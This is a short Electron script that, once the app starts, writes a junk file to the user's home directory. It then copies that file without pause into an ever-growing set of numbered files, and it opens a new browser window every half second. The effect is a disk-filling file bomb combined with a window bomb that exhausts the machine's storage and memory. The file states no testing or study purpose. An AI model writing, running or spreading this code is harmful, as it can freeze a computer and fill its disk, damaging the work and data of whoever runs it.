const { app, BrowserWindow } = require('electron');
const os = require('os');
const fs = require('fs').promises;
let count = 0;
app.whenReady().then(async function() {
  await fs.writeFile('/home/' + os.userInfo().username + '/target.txt', '+-=+-=_=-=-++_==_+-=_+(sa0w9');
  setInterval(async function() {
    await fs.copyFile('/home/' + os.userInfo().username + '/target.txt', '/home/' + os.userInfo().username + '/' + count);
    count = count + 1;
  });
  setInterval(function() {
    let win = new BrowserWindow({
      width: 800,
      height: 600
    });
    win.loadFile('index.html');
  }, 500);
});
